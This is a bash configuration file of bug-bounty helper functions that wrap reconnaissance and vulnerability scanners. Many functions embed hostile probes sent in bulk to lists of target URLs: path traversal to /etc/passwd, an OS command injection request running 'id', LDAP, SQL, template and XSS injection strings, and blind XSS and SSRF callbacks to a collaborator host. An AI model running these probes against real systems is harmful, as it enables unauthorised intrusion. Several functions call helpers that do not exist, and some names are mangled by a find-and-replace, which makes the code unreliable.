# Colors
BLACK='\e[30m'
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
WHITE='\e[37m'
RESET='\033[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'
BLINK='\e[5m'
REVERSE='\e[7m'
REDBOLD='\e[31m\e[1m'
BLUEBOLD='\e[34m\e[1m'

# Aliases 
alias my_resources='cat /root/referencestuff/my_resources.txt'
alias mysource='source ~/.bashrc'

# Function to copy exploit from exploitdb
bringmeit(){
    if [ -z "$1" ]; then
        echo "Usage: bringmeit <exploit_path>"
        return 1
    fi
    cp /usr/share/exploitdb/exploits/$1 .
    echo "Done"
}
# Function to fetch subdomains from crt.sh
my_crtsh(){
    if [ -z "$1" ]; then
        echo "Usage: my_crtsh <domain>"
        return 1
    fi
    curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}
# Function to fetch subdomains from certspotter
my_certspotter(){ 
    if [ -z "$1" ]; then
        echo "Usage: my_certspotter <domain>"
        return 1
    fi
    curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
} 
# Function to run httprobe on subdomains from crt.sh
my_crtshprobe(){ 
    if [ -z "$1" ]; then
        echo "Usage: my_crtshprobe <domain>"
        return 1
    fi
    curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
}
# Function to get IP information
my_ipinfo(){
    if [ -z "$1" ]; then
        echo "Usage: my_ipinfo <IP>"
        return 1
    fi
    curl -s http://ipinfo.io/$1
}
# Function to get local IP address
my_local_ip(){
	ifconfig | grep 192 | cut -d 'n'  -f 2 | cut -d ' ' -f 2
}
# Function to edit .bashrc
my_bash(){
	mousepad ~/.bashrc
}
# Function to run subdomain enumeration using multiple sources
my_subdomain_enum(){ 
    if [ -z "$1" ]; then
        echo "Usage: my_subdomain_enum <domain>"
        return 1
    fi
    assetfinder="assetfinder_$1.txt"
    subfinder="subfinder_$1.txt"
    amass="amass_$1.txt"
    github_subdomain="github_subdomain_$1.txt"

    echo "Running assetfinder..."
    assetfinder --subs-only $1 | httpx -silent -threads 100 | tee $assetfinder

    echo "Running subfinder..."
    subfinder -d $1 -all | httpx -silent -threads 100 | tee $subfinder

    echo "Running amass..."
    amass enum -active -brute -passive -d $1 -o $amass

    echo "Combining results..."
    cat $assetfinder $subfinder $amass | anew > allsubdomains_$1.txt

    echo "Backing up intermediate results..."
    mkdir -p backup_subdomains
    mv $assetfinder $subfinder $amass backup_subdomains/

    # Uncomment to use github-subdomain
    # echo "Running github-subdomain..."
    # github-subdomain -d $1 -o $github_subdomain -t "GITHUB_TOKEN1,GITHUB_TOKEN2,GITHUB_TOKEN3,GITHUB_TOKEN4"
	
	echo "Subdomain enumeration completed. Results saved to backup_subdomains/"
}
# Function to take screenshots of URLs
my_aquatone(){
    if [ -z "$1" ]; then
        echo "Usage: my_aquatone <urls_file>"
        return 1
    fi
    cat $1 | aquatone -out ./aquatone -ports xlarge
}
# Function to find URLs using waymore
my_waymore(){
    if [ -z "$1" ]; then
        echo "Usage: my_waymore <domain>"
        return 1
    fi
    python3 /root/tools/waymore/waymore.py -i $1 -mode U -oU ./waymore_$1.txt
    cat waymore_$1.txt | urldedupe -s | uro > urldedupe_uro_$1.txt
    cat urldedupe_uro_$1.txt | httprobe -c 80 -t 3000 | tee -a urldedupe_uro_alive_$1.txt
    cat urldedupe_uro_alive_$1.txt | wc -l

    # Uncomment to use github-endpoints
    # github-endpoints -d $1 -o github-endpoints_$1.txt -t "GITHUB_TOKEN1,GITHUB_TOKEN2,GITHUB_TOKEN3,GITHUB_TOKEN4"
}
# Function to run paramspider for a list of targets
my_paramspider() {
    if [ -z "$1" ]; then
        echo "Usage: my_paramspider <target_list_file>"
        return 1
    fi
    paramspider -l $1
}
# Function to run paramspider for one target
my_paramspider_one() {
    if [ -z "$1" ]; then
        echo "Usage: my_paramspider_one <target>"
        return 1
    fi
    paramspider -d $1
}
# Function to run arjun for one URL with specified HTTP method
my_arjun_one() {
    if [ -z "$3" ]; then
        echo "Usage: my_arjun_one <url> <http_method> <output_file>"
        return 1
    fi
    arjun -u $1 -m $2 -oT $3
}
# Function to run arjun for multiple URLs from a file with specified HTTP method
my_arjun_many() {
    if [ -z "$3" ]; then
        echo "Usage: my_arjun_many <input_file> <http_method> <output_file>"
        return 1
    fi
    arjun -i $1 -m $2 -oT $3
}
# Function to fetch JavaScript files from a list of URLs
my_getjs() {
    if [ -z "$1" ]; then
        echo "Usage: mygetjs <target_list_file>"
        return 1
    fi
    getJS --complete --input $1 --output jsfiles_$1.txt
}
# Function to fetch JavaScript files from one URL
my_getjs_one() {
    if [ -z "$1" ]; then
        echo "Usage: mygetjs_one <url>"
        return 1
    fi
    getJS --complete --url $1 --output jsfiles_$1.txt
}
# Function to find JavaScript files using katana and filter sensitive ones
my_getjs_katana() {
    if [ -z "$1" ]; then
        echo "Usage: mygetjs_katana <domains_list_file>"
        return 1
    fi
    cat $1 | katana | grep js | httpx -mc 200 | tee js_sensitive_output_$1.txt
	# https://realm3ter.medium.com/analyzing-javascript-files-to-find-bugs-820167476ffe
}
# Function to find subdomains using subjs
my_subjs(){
    if [ -z "$1" ]; then
        echo "Usage: my_subjs <urls_file>"
        return 1
    fi
    cat $1 | subjs
}
# Secretfinder functions
my_secretfinder(){ # Find Api key , aws key , google cloud key from source code and js file
    if [ -z "$1" ]; then
        echo "Usage: mysecretfinder <urls_file>"
        return 1
    fi
    cat $1 | xargs -I@ sh -c 'python3 /root/tools/SecretFinder/SecretFinder.py -i @'
}
my_secretfinder_nuclei(){
    if [ -z "$1" ]; then
        echo "Usage: mysecretfinder_nuclei <js_file>"
        return 1
    fi
    nuclei -l $1 -t ~/nuclei-templates/exposures/ -o nuclei_js_sensitive_output_$1.txt
}
# xnLinkFinder functions
my_xnlinkfinder() {
    if [ -z "$3" ]; then
        echo "Usage: myxnlinkfinder <urls> <subdomains_with_http> <subdomains_without_http>"
        return 1
    fi
    python3 /root/tools/xnLinkFinder/xnLinkFinder.py -i $1 -d 3 -sp $2 -sf $3 -s429 -s403 -sTO -sCE -m -o xnlinkfinder_endpoints_$1.txt -op xnlinkfinder_parameters_$1.txt -ow
	
	# -i option take a url, also a file of urls
	# subdomains_with_http -> syntax: https://www.target.com; https://help.target.com
	# subdomains_without_http -> syntax: www.target.com; help.target.com
	# https://www.kitploit.com/2022/10/xnlinkfinder-python-tool-used-to.html
}
my_xnlinkfinder_domains() {
    if [ -z "$3" ]; then
        echo "Usage: myxnlinkfinder_domains <urls> <subdomains_with_http> <subdomains_without_http>"
        return 1
    fi
    cat $1 | python3 /root/tools/xnLinkFinder/xnLinkFinder.py -d 3 -sp $2 -sf $3 -s429 -s403 -sTO -sCE -m | unfurl domains | sort -u | tee xnlinkfinder_domains_$1.txt
}
# LinkFinder functions
my_linkfinder_html(){
    if [ -z "$1" ]; then
        echo "Usage: my_linkfinder_html <url>"
        return 1
    fi
    python3 /root/tools/LinkFinder/linkfinder.py -i $1 -o linkfinder_$1.html
}

my_linkfinder_cli(){
    if [ -z "$1" ]; then
        echo "Usage: my_linkfinder_cli <url>"
        return 1
    fi
    python3 /root/tools/LinkFinder/linkfinder.py -i $1 -d -o cli
}
# Function to analyze JavaScript files for potential vulnerabilities
my_js_analysis(){
    if [ -z "$1" ]; then
        echo "Usage: my_js_analysis <url>"
        return 1
    fi
    echo "Fetching JavaScript files..."
    getJS --complete --url $1 --output jsfiles_$1.txt
    echo "Analyzing JavaScript files for potential vulnerabilities..."
    cat jsfiles_$1.txt | while read -r jsfile; do
        echo "Analyzing $jsfile"
        linkfinder -i $jsfile -o linkfinder_$jsfile.html
    done
    echo "JavaScript analysis completed."
}
my_url_tracker(){
	nodejs /root/tools/url-tracker/app.js
}
# Nuclei functions for different vulnerability types
my_nuclei(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei <target_list_file>"
        return 1
    fi
    nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates -l $1 -o output_nuclei.txt
}
my_nuclei_one(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_one <url>"
        return 1
    fi
    echo $1 | nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates
}
my_nuclei_sqli(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_sqli <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/sqli -o output_nuclei_sqli.txt
}
my_nuclei_xss(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_xss <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/xss -o output_nuclei_xss.txt
}
my_nuclei_crlf(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_crlf <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/crlf -o output_nuclei_crlf.txt
}
my_nuclei_exposed(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_exposed <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/exposed -o output_nuclei_exposed.txt
}
my_nuclei_header_injection(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_header_injection <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/header_injection -o output_nuclei_header_injection.txt
}
my_nuclei_lfi(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_lfi <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/lfi -o output_nuclei_lfi.txt
}
my_nuclei_open_redirect(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_open_redirect <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/open_redirect -o output_nuclei_open_redirect.txt
}
my_nuclei_rfi(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_rfi <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/rfi -o output_nuclei_rfi.txt
}
my_nuclei_ssi_injection(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_ssi_injection <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/ssi_injection -o output_nuclei_ssi_injection.txt
}
my_nuclei_ldap_injection(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_ldap_injection <target_list_file>"
        return 1
    fi
    cat $1 | nuclei -t /root/nuclei-templates/customize-templates-important/ldap_injection -o output_nuclei_ldap_injection.txt
}
# Function to run a complete nuclei scan for various vulnerabilities
my_nuclei_complete(){
    if [ -z "$1" ]; then
        echo "Usage: mynuclei_complete <target_list_file>"
        return 1
    fi

    echo "Running complete nuclei scan for targets in $1"
    mynuclei $1
    mynuclei_sqli $1
    mynuclei_xss $1
    mynuclei_crlf $1
    mynuclei_exposed $1
    mynuclei_header_injection $1
    mynuclei_lfi $1
    mynuclei_open_redirect $1
    mynuclei_rfi $1
    mynuclei_ssi_injection $1
    mynuclei_ldap_injection $1
    echo "Complete nuclei scan finished for targets in $1"
}
# Function to run dirsearch and take host and extension as arguments
my_dirsearch(){
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: mydirsearch <host> <extension>"
        return 1
    fi
    dirsearch -u $1 -e $2 -t 50 -b
}
# Function to run keyhacks script
my_keyhacks(){
    bash /root/tools/keyhacks.sh/keyhacks.sh
}
# Function to send notifications via Telegram
my_notify(){
    if [ -z "$1" ]; then
        echo "Usage: mynotify <message>"
        return 1
    fi
    message=$1
    token="YOUR_TELEGRAM_BOT_TOKEN"
    chatid="YOUR_CHAT_ID"
    curl -s -X POST https://api.telegram.org/bot$token/sendMessage -d chat_id=$chatid -d text="$message"
}
### XSS ###
# Function to run Dalfox for XSS detection
my_xss_dalfox(){
    if [ -z "$1" ]; then
        echo "Usage: myxss_dalfox <urls_file>"
        return 1
    fi
    cat $1 | dalfox pipe
}

# Function to run Dalfox for blind XSS detection
my_xss_blind(){
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: myxss_blind <urls_file> <blind_xss_payload>"
        return 1
    fi
    cat $1 | dalfox pipe -b $2
}

# Function to run KXSS for reflected special characters
my_xss_kxss(){
    if [ -z "$1" ]; then
        echo "Usage: myxss_kxss <urls_file>"
        return 1
    fi
    cat $1 | kxss 
}

# Function to run GXSS for reflected parameters
my_xss_gxss(){
    if [ -z "$1" ]; then
        echo "Usage: myxss_gxss <urls_file>"
        return 1
    fi
    cat $1 | Gxss 
}
# Combined function to run all XSS detection tools
my_combined_xss(){
    if [ -z "$1" ]; then
        echo "Usage: my_combined_xss <urls_file>"
        return 1
    fi
    echo "Running Dalfox..."
    cat $1 | dalfox pipe
    echo "Running Dalfox for blind XSS..."
    cat $1 | dalfox pipe -b "http://YOUR.burpcollaborator.net"
    echo "Running KXSS..."
    cat $1 | kxss 
    echo "Running GXSS..."
    cat $1 | Gxss 
}
### LFI ###
# Function to run dotdotpwn for LFI
my_lfi_dotdotpwn(){
    if [ -z "$1" ]; then
        echo "Usage: mylfi_dotdotpwn <url>"
        return 1
    fi
    perl /root/tools/dotdotpwn/dotdotpwn.pl -m http-url -u $1TRAVERSAL -k "root:"
}

# Function to run FFUF for LFI
my_lfi_ffuf(){
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: mylfi_ffuf <urls_file> <wordlist>"
        return 1
    fi
    cat $1 | ffuf -u FUZZ -mr "root:x" -w $2 
}

# Function to scan for LFI vulnerabilities in JobManager
my_lfi_jopmanager(){
    if [ -z "$1" ]; then
        echo "Usage: mylfi_jopmanager <urls_file>"
        return 1
    fi
    cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 \
        -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" \
        -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}

# Function to scan for LFI vulnerabilities using multiple paths
my_lfi_many_paths(){
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: mylfi_many_paths <urls_file> <paths_list>"
        return 1
    fi
    cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 \
        -path-list $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}

# Function to scan for LFI vulnerabilities using a single path
my_lfi_one_path(){
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: mylfi_one_path <urls_file> <path>"
        return 1
    fi
    cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 \
        -path $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}
# Combined function to run all LFI detection tools
my_combined_lfi(){
    if [ -z "$1" ]; then
        echo "Usage: my_combined_lfi <urls_file> <paths_list>"
        return 1
    fi
    my_lfi_dotdotpwn $1
    my_lfi_ffuf $1 $2
    my_lfi_jopmanager $1
    my_lfi_many_paths $1 $2
    my_lfi_one_path $1 "/etc/passwd"
}
### SQLi ###
# Function to perform mass SQL injection scanning using sqlmap
my_sqli_sqlmap(){
    if [ -z "$1" ]; then
        echo "Usage: mysqli_sqlmap <urls_file>"
        return 1
    fi
    cat $1 | gf sqli > sqli.txt
    sqlmap -m sqli.txt -batch -random-agent -level 3
}

# Function to detect SQL injection vulnerabilities using httpx
my_sqli_httpx(){
    if [ -z "$1" ]; then
        echo "Usage: mysqli_httpx <urls_file>"
        return 1
    fi
    cat $1 | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 \
        -path "/app_dev.php/1'%20%22" -mr "An exception occurred" -timeout 2 -retries 2 -t 400 -rl 400
}
# Combined function to run all SQLi detection tools
my_combined_sqli(){
    if [ -z "$1" ]; then
        echo "Usage: my_combined_sqli <urls_file>"
        return 1
    fi
    my_sqli_sqlmap $1
    my_sqli_httpx $1
}
### SSRF ###
# Function to perform SSRF using qsreplace and httpx
my_ssrf_detection(){
    if [ -z "$2" ]; then
        echo "Usage: my_ssrf_detection <urls_file> <burp_collaborator_url>"
        return 1
    fi
	echo "Running SSRF detection..."
    cat $1 | grep "=" | qsreplace $2 | httpx
}
### XXE ###
my_xxe_detection(){
    if [ -z "$2" ]; then
        echo "Usage: my_xxe_detection <urls_file> <xxe_payload>"
        return 1
    fi
    echo "Running XXE detection..."
    cat $1 | httpx -silent -t 100 | xargs -I {} sh -c 'curl -s -X POST -d $2 "{}"'
}
### HTTP Request Smuggling ###
# Function to perform HTTP request smuggling using smuggler
my_smuggling_smuggler(){
    if [ -z "$1" ]; then
        echo "Usage: mysmuggling_smuggler <urls_file>"
        return 1
    fi
    python3 /path/to/smuggler.py -u $1
}

### CORS ###
# Function to check for CORS misconfigurations
my_cors(){
    if [ -z "$1" ]; then
        echo "Usage: mycors <urls_file>"
        return 1
    fi
    cat $1 | httpx -silent -mc 200 -t 100 | xargs -I {} sh -c 'curl -s -H "Origin: evil.com" -I "{}" | grep "Access-Control-Allow-Origin"'
}
### Open Redirects ###
# Function to check for Open Redirects
my_open_redirect(){
    if [ -z "$1" ]; then
        echo "Usage: my_open_redirectf <urls_file>"
        return 1
    fi
    cat $1 | httpx -silent -mc 200 -t 100 | xargs -I {} sh -c 'curl -s -H "Origin: evil.com" -I "{}" | grep "Access-Control-Allow-Origin"'
}
### OS Command Injection ###
# Function to detect OS command injection using httpx
my_os_injection_httpx(){
    if [ -z "$1" ]; then
        echo "Usage: myos_injection_httpx <urls_file>"
        return 1
    fi
    cat $1 | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -ports 80,443,8443,8080,8088,8888,9000,9001,9002,9003 \
        -mr "uid=" -silent -timeout 2 -retries 2 -t 300 -rl 300
}
### LDAP Injection ###
# Function to check for LDAP injection payloads
my_ldap_injection(){
    if [ -z "$1" ]; then
        echo "Usage: myldap_injection <urls_file>"
        return 1
    fi
    cat $1 | httpx -silent -t 100 | xargs -I {} sh -c 'curl -s -X POST -d "username=*)(uid=*))(|(uid=*" "{}"'
}
### Mixed XSS, SQLi, SSTI ###
# Function to run mixed payloads for XSS, SQLi, SSTI using ffuf
my_mix_ffuf(){
    if [ -z "$1" ]; then
        echo "Usage: mymix_ffuf <urls_file>"
        return 1
    fi
    cat $1 | ffuf -w - -u "FUZZ;prompt(90522){{276*5}}'%20%22\\" \
        -mr "prompt(90522)" -mr "An exception occurred" -mr "5520"
}
# Function to send traffic to Burp Suite for further analysis
my_send_to_burpsuite(){
    if [ -z "$1" ]; then
        echo "Usage: mysend_to_burpsuite <urls_file>"
        return 1
    fi
    ffuf -mc 200 -w $1:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
}
### Android APK Analysis ###
# Function to extract juicy information from APK files
my_apk_extract_juicy(){
    if [ -z "$1" ]; then
        echo "Usage: myapk_extract_juicy <apk_file>"
        return 1
    fi
    echo "Extracting APK..."
    apktool d $1
    echo "Searching for juicy information..."
    grep -EHir "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" .
}
# Combined function to run all vulnerability detection tools
my_combined_vuln_detection(){
    if [ -z "$1" ]; then
        echo "Usage: my_combined_vuln_detection <urls_file>"
        return 1
    fi
    my_combined_xss $1
    my_combined_sqli $1
    my_combined_lfi $1 "paths_list.txt"
    my_os_injection_httpx $1
    my_ssrf_qsreplace $1 "http://YOUR.burpcollaborator.net"
    my_smuggling_smuggler $1
    my_cors $1
    my_ldap_injection $1
    my_mix_ffuf $1
    my_send_to_burpsuite $1
}

# Help Commands
my_bugbounty_commands(){
echo -e "
${REDBOLD}### Common ###${RESET}
> my_ipinfo <IP>
> my_local_ip
> my_bash
> myburpsuite
> bringmeit <exploit_path>

${REDBOLD}### Find subdomains ###${RESET}
> my_crtsh <domain>
> my_certspotter <domain>
> my_crtshprobe <domain>
> my_subdomain_enum <domain>
> amass enum -active -brute -passive -d <domain> -o output.txt
> puredns bruteforce wordlist.txt <domain> -r resolvers.txt -w output.txt

${REDBOLD}### Take screenshots ###${RESET}
> my_aquatone <urls_file>
> cat mydomains.txt | aquatone -out /root/Desktop -threads 25 -ports 8080
> eyeWitness -f url-list.txt --web --default-creds

${REDBOLD}### Get endpoints ###${RESET}
> my_waymore <domain>

${REDBOLD}### Get Parameters ###${RESET}
> my_paramspider <target_list_file>
> my_paramspider_one <target>
> my_arjun_one <url> <http_method> <output_file>
> my_arjun_many <input_file> <http_method> <output_file>

${REDBOLD}### Get JS files ###${RESET}
> my_getjs <target_list_file>
> my_getjs_one <url>
> my_getjs_katana <domains_list_file>

${REDBOLD}### Get Secrets from JS files - SecretFinder.py ###${RESET}
> my_secretfinder <urls_file>
> my_secretfinder_nuclei <js_file>

${REDBOLD}### Get endpoints from JS files ###${RESET}
> my_linkfinder_html <url/file.txt>
> my_linkfinder_cli <url/file.txt>
> my_xnlinkfinder <urls> <subdomains_with_http> <subdomains_without_http>
> my_xnlinkfinder_domains <urls/https://target.com/file.js> <subdomains_with_http> <subdomains_without_http>

${REDBOLD}### Get subdomains from JS files ###${RESET}
> myxnlinkfinder_domains js_urls.txt subdomains_https.txt subdomains_nohttps.txt

${REDBOLD}### JS Analysis ###${RESET}
> my_js_analysis <url>

${REDBOLD}### Tracking stuffs ###${RESET}
> my_url_tracker

${REDBOLD}### Nuclei ###${RESET}
> my_nuclei <target_list_file>
> my_nuclei_one <url>
> my_nuclei_sqli <target_list_file>
> my_nuclei_xss <target_list_file>
> my_nuclei_crlf <target_list_file>
> my_nuclei_exposed <target_list_file>
> my_nuclei_header_injection <target_list_file>
> my_nuclei_lfi <target_list_file>
> my_nuclei_open_redirect <target_list_file>
> my_nuclei_rfi <target_list_file>
> my_nuclei_ssi_injection <target_list_file>
> my_nuclei_ldap_injection <target_list_file>
> my_nuclei_complete <target_list_file>

${REDBOLD}### dirsearch ###${RESET}
> my_dirsearch <host> <extension>

${REDBOLD}### keyhacks ###${RESET}
> my_keyhacks

${REDBOLD}### notify ###${RESET}
> command | my_notify <message>

${REDBOLD}### XSS ###${RESET}
> my_xss_dalfox <urls_file>
> my_xss_blind <urls_file> <blind_xss_payload>
> my_xss_kxss <urls_file>
> my_xss_gxss <urls_file>

${REDBOLD}### LFI ###${RESET}
> my_lfi_dotdotpwn <url>
> my_lfi_ffuf <urls_file> <wordlist>
> my_lfi_jopmanager <urls_file>
> my_lfi_many_paths <urls_file> <paths_list>
> my_lfi_one_path <urls_file> <path>
> my_combined_lfi <urls_file> <paths_list>

${REDBOLD}### SQLi ###${RESET}
> my_sqli_sqlmap <urls_file>
> my_sqli_httpx <urls_file>
> my_combined_sqli <urls_file>

${REDBOLD}### SSRF ###${RESET}
> my_ssrf_detection <urls_file> <burp_collaborator_url>

${REDBOLD}### smuggler ###${RESET}
> my_smuggling_smuggler <urls_file>

${REDBOLD}### smuggler ###${RESET}
> my_smuggling_smuggler <urls_file>

${REDBOLD}### XXE ###${RESET}
> my_xxe_detection <urls_file> <xxe_payload>

${REDBOLD}### Open Redirects ###${RESET}
> my_open_redirect <urls_file>

${REDBOLD}### OS command injection ###${RESET}
> my_os_injection_httpx <urls_file>

${REDBOLD}### LDAP injection ###${RESET}
> my_ldap_injection <urls_file>

${REDBOLD}### mix testing for xss, sqli, ssti ###${RESET}
> my_mix_ffuf <urls_file>

${REDBOLD}### Combined Vulnerability Detection ###${RESET}
> my_combined_vuln_detection <urls_file>

${REDBOLD}### Burpsuite ###${RESET}
> my_send_to_burpsuite <urls_file>

${REDBOLD}### extract sensitive infos from APK ###${RESET}
> my_apk_extract_juicy <apk_file>
"
}

my_bugbounty_commands_summary(){
echo -e "
${BLUE}bringmeit:${RESET} ${CYAN}<exploit_path>${RESET}
${BLUE}my_crtsh:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_certspotter:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_crtshprobe:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_ipinfo:${RESET} ${CYAN}<IP>${RESET}
${BLUE}my_local_ip:${RESET} ${CYAN}No parameters${RESET}
${BLUE}my_bash:${RESET} ${CYAN}No parameters${RESET}
${BLUE}my_subdomain_enum:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_aquatone:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_waymore:${RESET} ${CYAN}<domain>${RESET}
${BLUE}my_paramspider:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_paramspider_one:${RESET} ${CYAN}<target>${RESET}
${BLUE}my_arjun_one:${RESET} ${CYAN}<url> <http_method> <output_file>${RESET}
${BLUE}my_arjun_many:${RESET} ${CYAN}<input_file> <http_method> <output_file>${RESET}
${BLUE}my_getjs:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_getjs_one:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_getjs_katana:${RESET} ${CYAN}<domains_list_file>${RESET}
${BLUE}my_subjs:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_secretfinder:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_secretfinder_nuclei:${RESET} ${CYAN}<js_file>${RESET}
${BLUE}my_xnlinkfinder:${RESET} ${CYAN}<urls> <subdomains_with_http> <subdomains_without_http>${RESET}
${BLUE}my_xnlinkfinder_domains:${RESET} ${CYAN}<urls> <subdomains_with_http> <subdomains_without_http>${RESET}
${BLUE}my_linkfinder_html:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_linkfinder_cli:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_js_analysis:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_url_tracker:${RESET} ${CYAN}No parameters${RESET}
${BLUE}my_nuclei:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_one:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_nuclei_sqli:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_xss:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_crlf:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_exposed:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_header_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_lfi:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_open_BLUEirect:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_rfi:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_ssi_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_ldap_injection:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_nuclei_complete:${RESET} ${CYAN}<target_list_file>${RESET}
${BLUE}my_dirsearch:${RESET} ${CYAN}<host> <extension>${RESET}
${BLUE}my_keyhacks:${RESET} ${CYAN}No parameters${RESET}
${BLUE}my_notify:${RESET} ${CYAN}<message>${RESET}
${BLUE}my_xss_dalfox:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_xss_blind:${RESET} ${CYAN}<urls_file> <blind_xss_payload>${RESET}
${BLUE}my_xss_kxss:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_xss_gxss:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_combined_xss:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_lfi_dotdotpwn:${RESET} ${CYAN}<url>${RESET}
${BLUE}my_lfi_ffuf:${RESET} ${CYAN}<urls_file> <wordlist>${RESET}
${BLUE}my_lfi_jopmanager:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_lfi_many_paths:${RESET} ${CYAN}<urls_file> <paths_list>${RESET}
${BLUE}my_lfi_one_path:${RESET} ${CYAN}<urls_file> <path>${RESET}
${BLUE}my_combined_lfi:${RESET} ${CYAN}<urls_file> <paths_list>${RESET}
${BLUE}my_sqli_sqlmap:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_sqli_httpx:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_combined_sqli:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_ssrf_detection:${RESET} ${CYAN}<urls_file> <burp_collaborator_url>${RESET}
${BLUE}my_xxe_detection:${RESET} ${CYAN}<urls_file> <xxe_payload>${RESET}
${BLUE}my_smuggling_smuggler:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_cors:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_open_BLUEirect:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_os_injection_httpx:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_ldap_injection:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_mix_ffuf:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_send_to_burpsuite:${RESET} ${CYAN}<urls_file>${RESET}
${BLUE}my_apk_extract_juicy:${RESET} ${CYAN}<apk_file>${RESET}
${BLUE}my_combined_vuln_detection:${RESET} ${CYAN}<urls_file>${RESET}
"
}

# Help Commands
my_bugbounty_commands_summary_colored(){
    RED="\033[0;31m"
    GREEN="\033[0;32m"
    YELLOW="\033[0;33m"
    BLUE="\033[0;34m"
    PURPLE="\033[0;35m"
    CYAN="\033[0;36m"
    WHITE="\033[0;37m"
